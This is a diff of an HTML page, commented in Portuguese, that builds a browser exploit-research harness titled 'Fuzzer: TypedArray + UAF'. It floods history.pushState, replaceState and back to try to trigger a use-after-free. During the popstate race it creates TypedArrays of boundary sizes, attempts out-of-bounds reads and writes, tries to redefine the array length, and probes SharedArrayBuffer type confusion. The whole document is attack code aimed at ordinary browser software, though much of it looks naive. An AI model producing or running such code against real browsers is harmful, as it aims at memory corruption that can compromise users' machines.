@@ -1,47 +1,113 @@
 <!DOCTYPE html>
-<html><body>
+<html>
+<head><title>Fuzzer: TypedArray + UAF</title></head>
+<body>
+<button onclick="fuzz()">Fuzz TypedArray</button>
+<pre id="log"></pre>
+
 <script>
-// TESTE RÁPIDO: OOB durante UAF
+const logEl = document.getElementById("log");
+function log(m) { logEl.textContent += m + "\n"; }
 
-const BASE = 977, STEP = 14461;
+const BASE = 977, STEP = 14461, UAF_ITERS = 48;
 
-async function test() {
-  // Trigger UAF
+async function triggerUAF() {
   let size = BASE;
-  for(let i=0; i<48; i++){
-    history.pushState({i}, "", "#" + "E".repeat(size));
-    history.replaceState({i}, "", "#" + "E".repeat(size>>1));
-    if(i%6===0) setTimeout(()=>history.back(),0);
+  for(let i=0; i<UAF_ITERS; i++){
+    history.pushState({index:i}, "", "#" + "E".repeat(size));
+    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
     size += STEP;
     await new Promise(r=>setTimeout(r,5));
   }
-  
   await new Promise(r=>setTimeout(r,200));
+}
+
+async function fuzz() {
+  log("=== FUZZING: TypedArray + UAF ===\n");
   
-  // Durante race
+  // 1. Trigger UAF (desestabiliza heap)
+  log("[1] Triggering UAF to destabilize heap...");
+  await triggerUAF();
+  
+  // 2. Race window: criar TypedArrays durante estado inconsistente
   window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.i >= 40) {
-      console.log("RACE!");
+    if(e.state && e.state.index >= 40) {
+      log("\n[2] RACE WINDOW! Creating TypedArrays...");
       
-      // TESTE CRÍTICO
-      const arr = new Uint32Array(10);
-      arr[10] = 0xDEADBEEF;  // OOB write
-      const val = arr[10];    // OOB read
+      // FUZZ 1: Criar arrays com tamanhos suspeitos
+      const sizes = [
+        0,           // Zero size
+        -1,          // Negative (integer underflow?)
+        0x7FFFFFFF,  // Max int32
+        0x80000000,  // Min int32 (negative)
+        0xFFFFFFFF,  // Max uint32
+        1 << 30,     // Large power of 2
+        (1 << 30) - 1, // Just below
+        (1 << 30) + 1  // Just above
+      ];
       
-      console.log("arr[10] =", val ? "0x"+val.toString(16) : "undefined");
+      sizes.forEach((size, idx) => {
+        try {
+          const arr = new Uint32Array(size);
+          log(`  [${idx}] Created size ${size}: length=${arr.length}`);
+          
+          // Tentar OOB access
+          try {
+            arr[arr.length] = 0xDEADBEEF;     // OOB write
+            const val = arr[arr.length + 10]; // OOB read
+            if(val !== undefined) {
+              log(`    🚨 OOB READ! arr[${arr.length + 10}] = 0x${val.toString(16)}`);
+            }
+          } catch(e) {
+            // Expected
+          }
+          
+          // Tentar mudar length durante race
+          try {
+            Object.defineProperty(arr, 'length', {
+              value: 0xFFFFFFFF,
+              writable: true
+            });
+            log(`    ⚠️  Length modified to: ${arr.length}`);
+          } catch(e) {}
+          
+        } catch(e) {
+          log(`  [${idx}] Size ${size} failed: ${e.message}`);
+        }
+      });
       
-      if(val === 0xDEADBEEF) {
-        alert("🚨 OOB WORKS!");
+      // FUZZ 2: Criar ArrayBuffer compartilhado durante UAF
+      try {
+        const shared = new SharedArrayBuffer(0x10000);
+        const view1 = new Uint32Array(shared);
+        const view2 = new Float64Array(shared);
+        
+        view1[0] = 0x41424344;
+        log(`\n  SharedArrayBuffer test:`);
+        log(`    view1[0] = 0x${view1[0].toString(16)}`);
+        log(`    view2[0] = ${view2[0]}`);
+        
+        // Tentar type confusion
+        view2[0] = 1.9526917464711512e-246; // 0x4141414141414141 em float
+        log(`    After float write:`);
+        log(`    view1[0] = 0x${view1[0].toString(16)}`);
+        log(`    view1[1] = 0x${view1[1].toString(16)}`);
+        
+      } catch(e) {
+        log(`  SharedArrayBuffer: ${e.message}`);
       }
     }
   });
   
+  // Trigger race
   for(let i=0; i<15; i++) {
     history.back();
     await new Promise(r=>setTimeout(r,40));
   }
+  
+  log("\n[3] Fuzzing complete. Check for crashes/OOB.");
 }
-
-test();
 </script>
-</body></html>
+</body>
+</html>
